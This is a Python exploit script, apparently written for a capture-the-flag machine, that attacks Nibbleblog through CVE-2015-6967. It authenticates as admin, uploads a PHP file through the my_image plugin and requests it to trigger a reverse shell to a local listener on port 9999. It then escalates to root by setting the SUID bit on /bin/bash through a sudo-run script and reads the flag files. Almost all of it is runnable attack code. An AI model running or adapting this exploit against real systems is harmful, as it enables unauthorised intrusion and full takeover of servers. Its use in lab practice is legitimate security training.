#!/usr/bin/python3

# Requirements:
# - ¡¡¡You need to have the php file in the same path as the script!!!
# - ¡¡¡You have to be listening on a port!!!

import sys
import signal
import requests
import argparse
import glob
import threading
import time
from pwn import *

def def_handler(sig,frame):
    print("\n[!] Saliendo...")
    sys.exit(1)

#CTRL+C
signal.signal(signal.SIGINT,def_handler)

#Global variables
main_url=""
user=""
passwd=""
# functions

def exploit ():

    p1=log.progress("Exploiting Phase")
    p1.status("Starting authentication")
    time.sleep(2)

    session=requests.Session()
    #Obtaining the session cookie
    r=session.get(main_url)
    
    #URL
    url=main_url+"/admin.php"

    #Post data
    post_data={'username':user,'password':passwd}
    
    #Headers
    req_headers={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0'}
    r2=session.post(url,data=post_data,headers=req_headers)
    
    p1.status("Authenticated")
    time.sleep(2)
    p1.status("Exploiting CVE-2015-6967")
    time.sleep(2)
    #Post Data
    post_data={"plugin":"my_image", "title":"My image", "position":4, "caption":"asd", "image_resize":1, "image_width":230, "image_height":200, "image_option":"auto"}
    
    #I get the name of the file to upload
    filename=glob.glob('*php')
    pwn_file= {'file1':open(filename[0],'rb')}
    
    #Headers
    req_headers={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0'}
    
    #Request with the file to upload
    r=session.post(main_url+"/admin.php?controller=plugins&action=config&plugin=my_image",headers=req_headers,data=post_data,files=pwn_file)
    
    #Executing the reverse_shell
    r1=session.get(main_url+"/content/private/plugins/my_image/file1.php")

    p1.success("exploit ran correctly")
    time.sleep(2)

# main
if __name__=="__main__":
    
    # collecting script parameters
    parser=argparse.ArgumentParser(usage='%(prog)s <base_url> <user> <password>', description='Tool for gaining access to a Nibbleblog server with an unprivileged user')
    parser.add_argument('url',help='Base URL where Nibbleblog is located')
    parser.add_argument('user',help='User for admin authentication')
    parser.add_argument('passwd',help='Admin password')
    arguments=parser.parse_args()

    main_url=arguments.url
    user=arguments.user
    passwd=arguments.passwd

    try:
        threading.Thread(target=exploit).start()
    except Exception as e:
        print("No se ha podido generar el subproceso: "+str(e))
        sys.exit(1)
    
    shell=listen(9999,timeout=20).wait_for_connection()
    
    p2=log.progress("Privesc Phase")
    p2.status("Escalating privileges")
    time.sleep(2)

    shell.sendline(b"cd /home/nibbler; cat user.txt")

    shell.sendline(b"mkdir -p ./personal/stuff; cd /home/nibbler/personal/stuff/")

    shell.sendline(b"echo 'chmod u+s /bin/bash' > monitor.sh; chmod +x monitor.sh; sudo -u root /home/nibbler/personal/stuff/monitor.sh; bash -p")

    shell.sendline(b"cd /root; cat root.txt")
    
    p2.status("¡¡¡YOU ARE ROOT!!!")
    sleep(2)

    shell.interactive()
